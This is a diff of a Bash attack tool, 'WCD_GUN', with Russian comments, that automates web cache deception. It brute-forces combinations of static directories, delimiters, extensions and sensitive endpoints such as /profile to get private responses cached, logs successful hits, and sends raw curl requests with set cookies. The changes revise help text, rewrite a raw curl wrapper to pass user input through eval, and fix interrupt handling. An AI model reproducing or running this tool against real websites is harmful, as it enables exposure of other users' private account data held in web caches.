@@ -1,13 +1,13 @@
 #!/bin/bash
 # =============================================================================
-# WCD_GUN v10.8 — Web Cache Deception Automated Cannon
+# WCD_GUN v10.11 — Web Cache Deception Automated Cannon
 # Исправлено:
 #   - fire() использует эндпоинты из обоймы (не хардкод /test)
 #   - burst() корректно работает с пустыми обоймами расширений
 #   - combo_shot() чистит двойные слеши
 #   - build_path() — единая функция сборки вектора
-#   - добавлена команда raw для прямых curl-запросов
-#   - двойной Ctrl+C для выхода из интерактивного режима
+#   - raw: добавлены пояснения про кавычки для спецсимволов
+#   - Ctrl+C: двойной для выхода, SHOULD_QUIT сбрасывается мгновенно
 # =============================================================================
 
 set +euo pipefail
@@ -49,7 +49,7 @@ die() {
 LOG_FILE=""
 SUCCESS_LOG=""
 RAM_DIR=""
-VERSION="10.8"
+VERSION="10.11"
 INTERRUPTED=false
 SHOULD_QUIT=false
 
@@ -537,7 +537,6 @@ burst_attack() {
     get_magazine_lines "$CURRENT_EXTENSIONS_FILE" "$RAM_DIR/burst_extensions.txt"
     get_magazine_lines "$CURRENT_ENDPOINTS_FILE"   "$RAM_DIR/burst_endpoints.txt"
 
-    # Если файл расширений пуст — он так и останется пустым, но мы это обработаем
     local ext_file="$RAM_DIR/burst_extensions.txt"
     if [[ ! -s "$ext_file" ]]; then
         echo "" > "$ext_file"
@@ -548,7 +547,6 @@ burst_attack() {
     local exts_count=$(wc -l < "$RAM_DIR/burst_extensions.txt" | tr -d ' ')
     local eps_count=$(wc -l < "$RAM_DIR/burst_endpoints.txt" | tr -d ' ')
 
-    # Если расширений нет — считаем как 1 (пустая строка)
     [[ $exts_count -eq 0 ]] && exts_count=1
 
     local total=$((staticdirs_count * delims_count * exts_count * eps_count))
@@ -602,7 +600,6 @@ fire() {
     while IFS= read -r line; do [[ -n "$line" ]] && exts+=("$line"); done < <(load_magazine "$CURRENT_EXTENSIONS_FILE" || true)
     while IFS= read -r line; do [[ -n "$line" ]] && eps+=("$line"); done < <(load_magazine "$CURRENT_ENDPOINTS_FILE" || true)
 
-    # Если расширения не загружены — создаём пустой элемент
     [[ ${#exts[@]} -eq 0 ]] && exts=("")
     [[ ${#delims[@]} -eq 0 ]] && { print_red "[!] Нет разделителей в обойме"; return 1; }
     [[ ${#eps[@]} -eq 0 ]] && { print_red "[!] Нет эндпоинтов в обойме"; return 1; }
@@ -713,7 +710,7 @@ show_quick_help() {
     echo -e "  ${WHITE}combo <sdir> <d> <e> <ep>${NC} - ручной вектор" >&2
     echo -e "  ${WHITE}burst${NC}               - тотальный перебор" >&2
     echo -e "  ${WHITE}fire${NC}                - быстрый обстрел" >&2
-    echo -e "  ${WHITE}raw <аргументы> <URL>${NC} - прямой curl-запрос" >&2
+    echo -e "  ${WHITE}raw <аргументы> <URL>${NC} - прямой curl-запрос (URL с ;?& брать в кавычки!)" >&2
     echo -e "  ${WHITE}proxy on|off${NC}        - управление прокси" >&2
     echo -e "  ${WHITE}magazines${NC}           - показать обоймы в магазине" >&2
     echo -e "  ${WHITE}hits${NC}                - показать успешные хиты" >&2
@@ -764,7 +761,7 @@ show_hits_list() {
 show_help() {
     cat << 'EOF' >&2
 ╔══════════════════════════════════════════════════╗
-║                WCD GUN v10.8 — СПРАВКА           ║
+║               WCD GUN v10.11 — СПРАВКА           ║
 ╚══════════════════════════════════════════════════╝
 
 КОМАНДЫ:
@@ -793,7 +790,14 @@ show_help() {
   set cookie "session=abc123"
   combo /images %3B .css profile
   raw -s -o /dev/null -D - http://127.0.0.1:8080/profile
-  burst
+
+ВАЖНО про raw:
+  Если URL содержит спецсимволы ; & ? # | $ — ОБЯЗАТЕЛЬНО бери в кавычки!
+  Правильно:  raw "http://target/profile;.css"
+  Неправильно: raw http://target/profile;.css   ← баш обрежет по ;
+
+  single /profile;.css  — работает без кавычек (read читает всю строку)
+  raw требует кавычек   — eval интерпретирует ; как разделитель команд
 EOF
 }
 
@@ -802,12 +806,35 @@ EOF
 # -----------------------------------------------------------------------------
 raw_curl() {
     local args=("$@")
-    [[ ${#args[@]} -eq 0 ]] && { print_red "raw <curl-аргументы> <URL>"; return 1; }
+
+    if [[ ${#args[@]} -eq 0 ]]; then
+        print_red "raw <curl-аргументы> <URL>"
+        print_yellow "  ВАЖНО: Если URL содержит ; & ? # | $ — бери в кавычки!"
+        print_dim "  Примеры:"
+        print_dim "    raw http://127.0.0.1:8080/profile"
+        print_dim "    raw -s -D - http://127.0.0.1:8080/profile"
+        print_dim "    raw \"http://127.0.0.1:8080/profile;.css\""
+        print_dim "    raw -X POST -d 'x=1' http://target/api"
+        return 1
+    fi
+
     local url="${args[-1]}"
-    unset 'args[-1]'
-    print_cyan "[RAW] do_curl $url ${args[*]}"
+
+    # Только URL без флагов — делаем простой GET с выводом тела
+    if [[ ${#args[@]} -eq 1 ]]; then
+        print_cyan "[RAW] GET $url"
+        echo ""
+        do_curl "$url" "-s"
+        local exit_code=$?
+        echo ""
+        return $exit_code
+    fi
+
+    # Есть флаги — URL последний, всё остальное аргументы curl
+    local curl_args=("${args[@]:0:${#args[@]}-1}")
+    print_cyan "[RAW] curl ${curl_args[*]} $url"
     echo ""
-    do_curl "$url" "${args[@]}"
+    do_curl "$url" "${curl_args[@]}"
     local exit_code=$?
     echo ""
     return $exit_code
@@ -849,7 +876,7 @@ main() {
     show_quick_help
 
     while true; do
-        $SHOULD_QUIT && { print_yellow "[*] Выход по двойному Ctrl+C."; break; }
+        $SHOULD_QUIT && { trap - INT; SHOULD_QUIT=false; print_yellow "[*] Выход по двойному Ctrl+C."; break; }
         $INTERRUPTED && { INTERRUPTED=false; }
 
         printf "${CYAN}wcd>${NC} "
@@ -881,7 +908,14 @@ main() {
             single)      single_shot "$arg1" ;;
             burst)       burst_attack ;;
             fire)        fire ;;
-            raw)         shift; raw_curl "${@}" ;;
+            raw)
+                local raw_args="${cmd_line#raw }"
+                if [[ -z "$raw_args" ]]; then
+                    raw_curl
+                else
+                    eval "raw_curl $raw_args"
+                fi
+                ;;
             add)         add_delimiter "$arg1" ;;
             magazines)   show_magazines_list ;;
             hits)        show_hits_list ;;
